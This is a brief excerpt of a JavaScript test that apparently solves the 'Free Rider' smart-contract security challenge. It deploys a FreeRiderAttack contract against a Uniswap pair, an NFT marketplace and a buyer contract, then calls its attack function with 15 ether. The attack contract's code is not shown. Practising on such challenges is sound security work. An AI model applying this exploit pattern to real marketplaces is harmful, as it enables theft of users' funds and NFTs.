...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        ...
        attackerContract = await (await ethers.getContractFactory('FreeRiderAttack', attacker))
            .deploy(this.uniswapPair.address, this.marketplace.address,this.weth.address, this.nft.address, this.buyerContract.address);

            await attackerContract.connect(attacker).attack(ethers.utils.parseEther('15'));

            // constructor(address _pair, address _marketplace, address _weth, address _nft, address _buyer)
    });
